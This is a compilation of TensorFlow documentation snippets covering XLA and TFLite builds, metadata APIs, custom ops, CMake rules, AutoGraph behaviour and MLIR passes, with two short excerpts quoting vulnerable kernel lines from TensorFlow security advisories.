DESCRIPTION: Executes the configuration script for the CUDA backend and then builds the XLA project using Bazel inside the running 'xla' Docker container. This compiles XLA specifically for GPU targets within the isolated environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/developer_guide.md#_snippet_4

LANGUAGE: sh
CODE:
```
docker exec xla ./configure.py --backend=CUDA
docker exec xla bazel build --test_output=all --spawn_strategy=sandboxed //xla/...
```

----------------------------------------

TITLE: Starting ProcessUnit - TFLite Support - Python
DESCRIPTION: This Python snippet shows the signature for the `ProcessUnitStart` function, part of the TFLite metadata schema generation API. It is used to begin defining a process unit section within the metadata builder. The `builder` parameter is required to add data to the flatbuffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ProcessUnitStart(
    builder
)
```

----------------------------------------

TITLE: Implementing TensorFlow Hash Table Find Operation (Python)
DESCRIPTION: This method wraps the custom `examples_simple_hash_table_find` op. It takes a key and an optional dynamic default value, converts them to tensors with appropriate dtypes, and calls the generated op function with the resource handle to look up the value, returning the found value or the default.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_16

LANGUAGE: Python
CODE:
```
  def find(self, key, dynamic_default_value=None, name=None):
    """Looks up `key` in a table, outputs the corresponding value.

    The `default_value` is used if key not present in the table.

    Args:
      key: Key to look up. Must match the table's key_dtype.
      dynamic_default_value: The value to use if the key is missing in the
        table. If None (by default), the `table.default_value` will be used.
      name: A name for the operation (optional).

    Returns:
      A tensor containing the value in the same shape as `key` using the
        table's value type.

    Raises:
      TypeError: when `key` do not match the table data types.
    """
    with tf.name_scope(name or "%s_lookup_table_find" % self._name):
      key = tf.convert_to_tensor(key, dtype=self._key_dtype, name="key")
      if dynamic_default_value is not None:
        dynamic_default_value = tf.convert_to_tensor(
            dynamic_default_value,
            dtype=self._value_dtype,
            name="default_value")
      value = gen_simple_hash_table_op.examples_simple_hash_table_find(
          self.resource_handle, key, dynamic_default_value
          if dynamic_default_value is not None else self._default_value)
    return value
```

----------------------------------------

TITLE: Defining Simple TensorFlow Function for XLA Python Example
DESCRIPTION: This Python function serves as a simple example to illustrate how XLA can optimize a sequence of TensorFlow operations by fusing them into a single kernel. The function performs multiplication, addition, and reduction.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_0

LANGUAGE: Python
CODE:
```
def model_fn(x, y, z):
  return tf.reduce_sum(x + y * z)
```

----------------------------------------

TITLE: Calling ImageSizeEnd Function (Python)
DESCRIPTION: Shows the standard call signature for the `ImageSizeEnd` function/method. This function is typically used when building a metadata schema to mark the end of an image size definition within the schema structure. It requires a `builder` object, likely an instance from a FlatBuffers builder library, as its single argument.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeEnd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ImageSizeEnd(
    builder
)
```

----------------------------------------

TITLE: Using Calculated Pooling Output Length (C++)
DESCRIPTION: This C++ snippet from TensorFlow's common fractional pooling code shows where the previously calculated `output_length` (which can be zero due to the vulnerability) is used. Specifically, it is used as a divisor in a modulo operation (`input_length % output_length`) and a division operation (`input_length / output_length`). If `output_length` is 0, this results in a runtime division by zero error and program termination.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-038.md#_snippet_2

LANGUAGE: cpp
CODE:
```
std::vector<int64> GeneratePoolingSequence(int input_length, int output_length,
                                           GuardedPhiloxRandom* generator,
                                           bool pseudo_random) {
  ...
  if (input_length % output_length == 0) {
    diff = std::vector<int64>(output_length, input_length / output_length);
  }
  ...
}
```

----------------------------------------

TITLE: Creating Tensors Inside Loop - Special Case (TF 2.4+)
DESCRIPTION: TensorFlow 2.4+ supports creating new tensors (or structures of tensors) inside a loop, even if not initialized before, provided they don't depend on previous iterations and the loop runs at least once. This is common for training loops producing outputs per step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_9

LANGUAGE: python
CODE:
```
for i in tf.range(num_steps):
  outputs = train(next(data_iterator))
```

----------------------------------------

TITLE: Filter TFLite Latency Benchmark Result Android Logcat ADB
DESCRIPTION: Clears the Android logcat (`adb logcat -c`) and then filters the colorized log output (`adb logcat -v color`) to find lines containing "Latency benchmark result". This provides a quick summary from the logcat output indicating whether the benchmark run for a specific settings file passed or failed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_11

LANGUAGE: ADB Shell
CODE:
```
adb logcat -c && adb logcat -v color | grep 'Latency benchmark result'
```

----------------------------------------

TITLE: Import Required Libraries for Object Detection Python
DESCRIPTION: This snippet imports essential Python libraries for object detection using TensorFlow Lite Model Maker. It includes imports from `tflite_model_maker.config`, `tflite_model_maker.model_spec`, and `tflite_model_maker.object_detector`, along with standard libraries like `numpy` and `os`, and sets up TensorFlow and logging.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_2

LANGUAGE: Python
CODE:
```
import numpy as np
import os

from tflite_model_maker.config import QuantizationConfig
from tflite_model_maker.config import ExportFormat
from tflite_model_maker import model_spec
from tflite_model_maker import object_detector

import tensorflow as tf
assert tf.__version__.startswith('2')

tf.get_logger().setLevel('ERROR')
from absl import logging
logging.set_verbosity(logging.ERROR)
```

----------------------------------------

TITLE: Pushing Delegate to Device Temp - ADB Shell
DESCRIPTION: Pushes the compiled stable delegate shared object file from the build output directory on the host machine to a temporary location (`/data/local/tmp/`) on the connected Android device using adb. This is an intermediate step before moving it to the app's private storage.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_6

LANGUAGE: Shell
CODE:
```
adb push \
  bazel-bin/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/libtensorflowlite_sample_stable_delegate.so \
  /data/local/tmp/
```

----------------------------------------

TITLE: Implementing TensorFlow Hash Table Find Kernel (C++)
DESCRIPTION: Implements the `Compute` method for the `SimpleHashTableFindOpKernel`, which first retrieves the `SimpleHashTableResource` object using the `GetResource` helper function and then calls the resource object's `Find` method to look up a given key, placing the result in an output tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_13

LANGUAGE: C++
CODE:
```
template <class K, class V>
class SimpleHashTableFindOpKernel : public OpKernel {
 public:
  explicit SimpleHashTableFindOpKernel(OpKernelConstruction* ctx)
      : OpKernel(ctx) {}

  void Compute(OpKernelContext* ctx) override {
    DataTypeVector expected_inputs = {DT_RESOURCE, DataTypeToEnum<K>::v(),
                                      DataTypeToEnum<V>::v()};
    DataTypeVector expected_outputs = {DataTypeToEnum<V>::v()};
    OP_REQUIRES_OK(ctx, ctx->MatchSignature(expected_inputs, expected_outputs));
    SimpleHashTableResource<K, V>* resource;
    OP_REQUIRES_OK(ctx, GetResource(ctx, &resource));
    // Note that ctx->input(0) is the Resource handle
    const Tensor& key = ctx->input(1);
    const Tensor& default_value = ctx->input(2);
    TensorShape output_shape = default_value.shape();
    Tensor* out;
    OP_REQUIRES_OK(ctx, ctx->allocate_output("value", output_shape, &out));
    OP_REQUIRES_OK(ctx, resource->Find(key, out, default_value));
  }
};
```

----------------------------------------

TITLE: Adding Description to Associated File - TFLite Support Python
DESCRIPTION: This Python function is used to add a description string to an AssociatedFile entry within the TFLite metadata schema being built. It takes the FlatBuffers builder object and the description string as arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileAddDescription.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileAddDescription(
    builder, description
)
```

----------------------------------------

TITLE: Building Specific Kernel Files with Debug Info - Bash
DESCRIPTION: Builds the TensorFlow pip package with global debug flags (`--config=dbg`) while specifically adding debugging information (`-g`) to files matching a pattern (`+tensorflow/core/kernels/identity_op.*`) using `--per_file_copt`. This allows focused debugging on individual kernel implementation files that might otherwise lack debug symbols. Requires Bazel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_18

LANGUAGE: bash
CODE:
```
bazel build --config=dbg --per_file_copt=+tensorflow/core/kernels/identity_op.*@-g //tensorflow/tools/pip_package:build_pip_package
```

----------------------------------------

TITLE: Configuring TFLite NNAPI Delegate CMake
DESCRIPTION: This block configures the TFLite NNAPI delegate based on the `_TFLITE_ENABLE_NNAPI` option. If enabled, it finds `fp16_headers`, populates NNAPI source lists (`TFLITE_DELEGATES_NNAPI_SRCS`, `TFLITE_NNAPI_SRCS`) excluding test/disabled files, appends the Support Library source, and optionally adds a verbose validation define. If disabled, it sets the source lists to point to disabled stub files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_31

LANGUAGE: CMake
CODE:
```
if(_TFLITE_ENABLE_NNAPI)
  find_package(fp16_headers REQUIRED)
  populate_tflite_source_vars("delegates/nnapi"
    TFLITE_DELEGATES_NNAPI_SRCS
    FILTER "(_test_list|_disabled)\\.(cc|h)$"
  )
  populate_tflite_source_vars(
    "nnapi" TFLITE_NNAPI_SRCS FILTER "(_disabled)\\.(cc|h)$"
  )

  list(APPEND TFLITE_NNAPI_SRCS
    "${TFLITE_SOURCE_DIR}/nnapi/sl/SupportLibrary.cc"
  )

  if(${TFLITE_ENABLE_NNAPI_VERBOSE_VALIDATION})
    list(APPEND TFLITE_TARGET_PUBLIC_OPTIONS "-DNNAPI_VERBOSE_VALIDATION")
  endif()
else()
  set(TFLITE_DELEGATES_NNAPI_SRCS
    "${TFLITE_SOURCE_DIR}/delegates/nnapi/nnapi_delegate_disabled.cc"
  )
  set(TFLITE_NNAPI_SRCS
    "${TFLITE_SOURCE_DIR}/nnapi/nnapi_implementation_disabled.cc"
  )
endif()
```

----------------------------------------

TITLE: Get Content Metadata - TensorMetadata (Python)
DESCRIPTION: Retrieves the content metadata object associated with the tensor. This object contains details regarding the data representation and properties of the tensor content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_3

LANGUAGE: python
CODE:
```
Content()
```

----------------------------------------

TITLE: Running TensorFlow Custom Op Tests (GPU/CPU Build, CPU Test) - Shell
DESCRIPTION: Provides the shell command using Bazel to build the custom multiplex op tests with CUDA support enabled via `--config=cuda`, but then executes the test specifically on the CPU target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_11

LANGUAGE: shell
CODE:
```
$ bazel test --config=cuda //third_party/tensorflow/google/g3doc/example/multiplex_2:multiplex_2_test
```

----------------------------------------

TITLE: Setting Keras Backend and Importing Libraries (Python)
DESCRIPTION: Sets the Keras backend environment variable to 'jax', imports JAX, NumPy, TensorFlow, Keras Core's ResNet50 model, and `jax2tf`. These imports are essential for loading the model, converting it from JAX to TensorFlow format, and preparing for quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/quantization/stablehlo/python/integration_test/stablehlo_quantizer_odml_oss.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
import os
os.environ['KERAS_BACKEND'] = 'jax'
import jax.numpy as jnp
import numpy as np
import tensorflow as tf
from keras_core.applications import ResNet50
from jax.experimental import jax2tf
```

----------------------------------------

TITLE: Lambda Closure Behavior in AutoGraph Loop Python
DESCRIPTION: Shows that lambda functions are treated differently by AutoGraph for backward compatibility. A lambda is assumed to be used locally, so a variable (`a`) modified inside a loop is treated as local to the loop, even if a lambda defined before the loop closes over it. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_21

LANGUAGE: Python
CODE:
```
a = 0
foo(lambda: a)  # This lambda is not expected to be called anywhere else.
for i in tf.range(3):  # Okay -- `a` is local to the loop.
  a = i
```

----------------------------------------

TITLE: Getting Unpopulated TFLite Metadata JSON (Python)
DESCRIPTION: This method retrieves the generated metadata as a JSON string before it has been populated into the TFLite model file. It's useful for inspecting the raw metadata structure; use `get_populated_metadata_json` to get the final version including fields added by the Populator. It returns the JSON string representation of the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_segmenter/MetadataWriter.md#_snippet_4

LANGUAGE: Python
CODE:
```
get_metadata_json() -> str
```

----------------------------------------

TITLE: Get Unpopulated Metadata JSON - TFLite Support - Python
DESCRIPTION: Retrieves the generated metadata as a JSON string before it has been embedded or populated into the model file. This representation may differ slightly from the final metadata within the model (e.g., lacking `min_parser_version`), and it returns the JSON string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/object_detector/MetadataWriter.md#_snippet_4

LANGUAGE: python
CODE:
```
get_metadata_json() -> str
```

----------------------------------------

TITLE: Unrolling Vector Loop - MLIR
DESCRIPTION: This snippet shows the result of unrolling the scf.for loop that iterated over the vector elements. The loop is eliminated, and the vector.extract and vector.insert operations for each individual vector element (indices c0, c1, c2, c3) are laid out sequentially, exposing more opportunities for optimization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_5

LANGUAGE: MLIR
CODE:
```
func.func @main(%input: tensor<12582912xbf16>, %arg1: tensor<12582912xbf16>) -> tensor<12582912xbf16> {

  %cst_0 = arith.constant dense<0.000000e+00> : vector<4xbf16>
  %dim = xla_gpu.apply_indexing #map(%thread_id_x, %block_id_x, %c0)
  %2 = vector.transfer_read %input[%dim], %cst {in_bounds = [true]} : tensor<12582912xbf16>, vector<4xbf16>
  %3 = vector.extract %2[%c0] : bf16 from vector<4xbf16>
  ...
  %13 = vector.insert %12, %cst_0 [%c0] : bf16 into vector<4xbf16>
  %14 = vector.extract %2[%c1] : bf16 from vector<4xbf16>
  ...
  %24 = vector.insert %23, %13 [%c1] : bf16 into vector<4xbf16>
  %25 = vector.extract %2[%c2] : bf16 from vector<4xbf16>
  ...
  %35 = vector.insert %34, %24 [%c2] : bf16 into vector<4xbf16>
  %36 = vector.extract %2[%c3] : bf16 from vector<4xbf16>
  ...
  %46 = vector.insert %45, %35 [%c3] : bf16 into vector<4xbf16>
  %47 = vector.transfer_write %46, %arg1[%dim] {in_bounds = [true]} : vector<4xbf16>, tensor<12582912xbf16>
  return %47 : tensor<12582912xbf16>
}
```

----------------------------------------

TITLE: Accessing Root ProcessUnit Buffer via GetRootAs Python
DESCRIPTION: A class method used to get the root `ProcessUnit` object from a FlatBuffers buffer. It takes the buffer and an optional offset as input and returns an instance of the `ProcessUnit` class pointing to the data within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnit.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Define and Link Benchmark Executable (CMake)
DESCRIPTION: This snippet defines the `benchmark_model` executable target using the collected source files. It applies conditional compile options and links the necessary libraries listed in `TFLITE_BENCHMARK_LIBS` to create the final executable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
add_executable(benchmark_model
  EXCLUDE_FROM_ALL
  ${TFLITE_BENCHMARK_SRCS}
)
target_compile_options(benchmark_model
  PRIVATE
    ${TFLITE_BENCHMARK_CC_OPTIONS}
)
target_include_directories(benchmark_model
  PUBLIC
    ${CMAKE_BINARY_DIR}
)
target_link_libraries(benchmark_model
    ${TFLITE_BENCHMARK_LIBS}
)
```

----------------------------------------

TITLE: Conditionally Adding External Delegate Sources (CMake)
DESCRIPTION: Appends the external delegate source file to the source list if the `TFLITE_ENABLE_EXTERNAL_DELEGATE` CMake option is enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_4

LANGUAGE: cmake
CODE:
```
if(TFLITE_ENABLE_EXTERNAL_DELEGATE)
  list(APPEND TFLITE_LABEL_IMAGE_SRCS
          ${TFLITE_SOURCE_DIR}/tools/delegates/external_delegate_provider.cc)
endif()
```

----------------------------------------

TITLE: Building TFLite External Delegate Shared Library (Shell)
DESCRIPTION: This command builds the external delegate implementation as a dynamic shared library (`.so` file) using Bazel. This shared library is required for the external delegate mechanism.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_4

LANGUAGE: Shell
CODE:
```
bazel build -c opt tensorflow/lite/delegates/utils/dummy_delegate:dummy_external_delegate.so
```

----------------------------------------

TITLE: Initializing ImageSizeT from Object in Python
DESCRIPTION: Class method to initialize an `ImageSizeT` object from an existing `ImageSizeT` object (`imageSize`). This serves as a copy or conversion constructor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageSizeT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod\nInitFromObj(\n imageSize\n)
```

----------------------------------------

TITLE: Verifying Identical SparseTensor Shapes (C++)
DESCRIPTION: These C++ conditions are used within 'OP_REQUIRES' to assert that the dense shapes of the input sparse tensors ('cond', 'a', and 'b') are identical along a specific dimension 'i'. This check is relevant when inputs are expected to represent the same underlying dense shape, allowing for a simpler shape calculation where the output shape matches the input shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_5

LANGUAGE: C++
CODE:
```
cond_shape(i) == a_shape(i)
a_shape(i) == b_shape(i)
```

----------------------------------------

TITLE: Loading Demo Data with Pandas in Python
DESCRIPTION: Reads the 'dev.csv' file into a pandas DataFrame, setting the first column as the index. This DataFrame will be used to demonstrate prediction with the exported TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
sentence_data = pd.read_csv('/content/dev.csv', index_col=0)
sentence_data
```

----------------------------------------

TITLE: Splitting and Merging Proto in Memory (C++)
DESCRIPTION: Illustrates how to create a C++ Splitter instance, call its `Split` method to get chunks and metadata in memory, and then use the C++ `Merger::Merge` method to reconstruct the proto without writing to disk.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/g3doc/in-depth-guide.md#_snippet_5

LANGUAGE: c++
CODE:
```
class ModelConfigSplitter : public ComposableSplitter {
  ...
};

ModelConfig my_proto{...};
string export_dir = "...";
ModelConfigSplitter my_splitter(my_proto);

// std::pair<std::vector<MessageBytes>*, ::proto_splitter::ChunkedMessage*>
auto[chunks, chunked_message] = my_splitter.Split();

// chunks, chunked_message are processed

ModelConfig my_new_proto;
Merger::Merge(chunks, chunked_message, &my_new_proto);
```

----------------------------------------

TITLE: Validating Source Directory Existence
DESCRIPTION: This conditional block checks if the `ML_DTYPES_SOURCE_DIR` variable is empty. If it is, it prints a fatal error message, halting the CMake configuration process and informing the user that the source directory must be specified.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
if(NOT ML_DTYPES_SOURCE_DIR)
  message(FATAL_ERROR "Must specify source directory")
endif()
```

----------------------------------------

TITLE: Checking Equality for TensorFlow Lite ImageSegmenterOptions Python
DESCRIPTION: Documents the signature of the `__eq__` method for the `ImageSegmenterOptions` class. This method is used to compare the current `ImageSegmenterOptions` object with another object (`other`) to check for equality.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSegmenterOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Vulnerable Session State Access in TensorFlow Kernel (C++)
DESCRIPTION: This C++ snippet from the TensorFlow kernel implementation (`tensorflow/core/kernels/session_ops.cc`) shows the vulnerable code line responsible for the TFSA-2021-007 null pointer dereference. It attempts to call `GetTensor` on the `ctx->session_state()` pointer without first checking if the pointer is valid (non-null). In eager mode, `session_state()` is null, leading to undefined behavior upon dereference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-007.md#_snippet_2

LANGUAGE: cpp
CODE:
```
  OP_REQUIRES_OK(ctx, ctx->session_state()->GetTensor(name, &val));
```

----------------------------------------

TITLE: Defining example Protobuf Library CMake
DESCRIPTION: Marks the generated files for `example.proto` as `GENERATED`, defines a static library `example_proto` using these files, links it against both the `feature_proto` and `protobuf::libprotobuf` libraries, and adds the binary directory to its public include paths.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/example/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
set_source_files_properties(${example_generated_files} PROPERTIES GENERATED TRUE)
add_library(example_proto ${example_generated_files})
target_link_libraries(example_proto feature_proto protobuf::libprotobuf)
target_include_directories(example_proto PUBLIC ${CMAKE_CURRENT_BINARY_DIR})
```

----------------------------------------

TITLE: Accessing Vocab File Data Python
DESCRIPTION: This instance method provides access to the vocabulary file data. It likely takes an index `j` if the vocabulary file data is represented as a vector or array within the flatbuffer structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_7

LANGUAGE: python
CODE:
```
VocabFile(
    j
)
```

----------------------------------------

TITLE: Outlining tf_device.cluster in MLIR
DESCRIPTION: This transformation pass outlines the body of a `tf_device.cluster` operation into a separate function. The original operation is replaced by `tf_device.cluster_func`, which calls the newly created function. Implicit operands become explicit arguments to the function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_4

LANGUAGE: MLIR
CODE:
```
func @computation(%arg0: tensor<i32>) -> tensor<i32> {
  %cluster = "tf_device.cluster"() ( {
    %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
    tf_device.return %identity : tensor<i32>
  }) : () -> (tensor<i32>)
  return %cluster : tensor<i32>
}
```

LANGUAGE: MLIR
CODE:
```
func @computation(%arg0: tensor<i32>) -> tensor<i32> {
  %cluster = "tf_device.cluster_func"(%arg0) {func = @_func} : (tensor<i32>) -> tensor<i32>
  return %cluster : tensor<i32>
}

func @_func(%arg0: tensor<i32>) -> tensor<i32> {
  %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
  return %identity : tensor<i32>
}
```

----------------------------------------

TITLE: Lazy Decoding of Struct Attributes from Dictionary
DESCRIPTION: Demonstrates how to retrieve and decode a previously registered struct attribute (`Range`) at runtime from the `Dictionary` object containing all custom call attributes using `get<T>(name)`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_14

LANGUAGE: C++
CODE:
```
auto handler = Ffi::Bind().Attrs().To([](Dictionary attrs) -> Error {
  ErrorOr<Range> range = attrs.get<Range>("range");
  return Error::Success();
});
```

----------------------------------------

TITLE: Setting Python Version for Bazel Builds Shell
DESCRIPTION: Demonstrates three alternative methods to specify the desired hermetic Python version for TensorFlow builds and tests managed by Bazel. You can set the `HERMETIC_PYTHON_VERSION` environment variable in `.bazelrc`, directly on the Bazel command line, or globally in your shell session before running Bazel commands.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/requirements_updater/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
# Either add an entry to your `.bazelrc` file
build --repo_env=HERMETIC_PYTHON_VERSION=3.12

# OR pass it directly to your specific build command
bazel build <target> --repo_env=HERMETIC_PYTHON_VERSION=3.12

# OR set the environment variable globally in your shell:
export HERMETIC_PYTHON_VERSION=3.12
```

----------------------------------------

TITLE: Illegal Inconsistent Dtype in AutoGraph If Error Python
DESCRIPTION: Shows the equivalent error in AutoGraph. An `if` statement that assigns a variable with inconsistent data types (`tf.int32` and `tf.float32`) in its branches, which AutoGraph converts to a `tf.cond`, results in a graph execution error. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_40

LANGUAGE: Python
CODE:
```
if tf.random.uniform(()) > 0.5:
  x = tf.constant(1, dtype=tf.int32)
else:
  x = tf.constant(1, dtype=tf.float32)  # Error -- inconsistent dtypes: int32, float32
```

----------------------------------------

TITLE: Example Using DotGeneral with Batch and Contracting Dimensions
DESCRIPTION: This pseudocode illustrates using XLA DotGeneral for batched matrix multiplication. It defines 3D input arrays representing batches of 2x2 matrices and configures DotDimensionNumbers for batch dimension 0 and specified contracting dimensions (2 on lhs, 1 on rhs).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_16

LANGUAGE: pseudocode
CODE:
```
lhs = { { {1.0, 2.0},
{3.0, 4.0} },
{ {5.0, 6.0},
{7.0, 8.0} } }

rhs = { { {1.0, 0.0},
{0.0, 1.0} },
{ {1.0, 0.0},
{0.0, 1.0} } }

DotDimensionNumbers dnums;
dnums.add_lhs_contracting_dimensions(2);
dnums.add_rhs_contracting_dimensions(1);
dnums.add_lhs_batch_dimensions(0);
dnums.add_rhs_batch_dimensions(0);

DotGeneral(lhs, rhs, dnums) -> { { {1.0, 2.0},
{3.0, 4.0} },
{ {5.0, 6.0},
{7.0, 8.0} } }
```

----------------------------------------

TITLE: Pushing Android Benchmark Binary to Device via ADB
DESCRIPTION: This command transfers the compiled Android benchmark tool binary from the local build directory to a temporary directory on a connected Android device using Android Debug Bridge (adb). Ensure the target directory exists on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_1

LANGUAGE: Bash
CODE:
```
adb push bazel-bin/tensorflow/tools/benchmark/benchmark_model /data/local/tmp
```

----------------------------------------

TITLE: Process Audio Samples Full Pipeline C++
DESCRIPTION: This C++ snippet demonstrates the complete workflow for processing raw audio data through the frontend library. It shows initializing configuration defaults, populating the state with the sample rate, processing a block of audio samples, and iterating over the resulting feature vector output. It requires a `FrontendConfig`, a `FrontendState` (presumably declared elsewhere), raw `int16` audio data, and its size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/microfrontend/lib/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
struct FrontendConfig frontend_config;
FrontendFillConfigWithDefaults(&frontend_config);
int sample_rate = 16000;
FrontendPopulateState(&frontend_config, &frontend_state, sample_rate);
int16_t* audio_data = ;  // PCM audio samples at 16KHz.
size_t audio_size = ;  // Number of audio samples.
size_t num_samples_read;  // How many samples were processed.
struct FrontendOutput output =
    FrontendProcessSamples(
        &frontend_state, audio_data, audio_size, &num_samples_read);
for (i = 0; i < output.size; ++i) {
  printf("%d ", output.values[i]);  // Print the feature vector.
}
```

----------------------------------------

TITLE: Defining Bazel Build Rules for TensorFlow Custom Op (Bazel)
DESCRIPTION: This `BUILD` file configures Bazel to build the custom TensorFlow op. It includes rules for compiling the C++ kernel (`tf_custom_op_library`), building the Python wrapper (`py_strict_library` for both the op bindings and the high-level class), and defining the test target (`tf_py_test`), specifying sources, dependencies, and metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_21

LANGUAGE: Bazel
CODE:
```
tf_custom_op_library(
    name = "simple_hash_table_kernel.so",
    srcs = [
        "simple_hash_table_kernel.cc",
        "simple_hash_table_op.cc",
    ],
    deps = [
        "//third_party/absl/container:flat_hash_map",
        "//third_party/tensorflow/core/lib/gtl:map_util",
        "//third_party/tensorflow/core/platform:strcat",
    ],
)

py_strict_library(
    name = "simple_hash_table_op",
    srcs = ["simple_hash_table_op.py"],
    data = ["simple_hash_table_kernel.so"],
    srcs_version = "PY3",
    deps = [
        "//third_party/py/tensorflow",
    ],
)

py_strict_library(
    name = "simple_hash_table",
    srcs = ["simple_hash_table.py"],
    srcs_version = "PY3",
    deps = [
        ":simple_hash_table_op",
        "//third_party/py/tensorflow",
    ],
)

tf_py_test(
    name = "simple_hash_table_test",
    size = "medium",  # This test blocks because it writes and reads a file,
    timeout = "short",  # but it still runs quickly.
    srcs = ["simple_hash_table_test.py"],
    python_version = "PY3",
    srcs_version = "PY3",
    tags = [
        "no_mac",  # TODO(b/216321151): Re-enable this test.
    ],
    deps = [
        ":simple_hash_table",
        "//third_party/py/numpy",
        "//third_party/py/tensorflow",
        "//third_party/tensorflow/python/framework:errors",
        "//third_party/tensorflow/python/framework:test_lib",
    ],
)
```

----------------------------------------

TITLE: Continue Statement in For Loop Transformed Output Python
DESCRIPTION: Output code generated by AutoGraph showing the transformation of a `continue` statement using an extra control boolean (`continue_`). Unlike `break`, `continue` is local to the loop iteration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_33

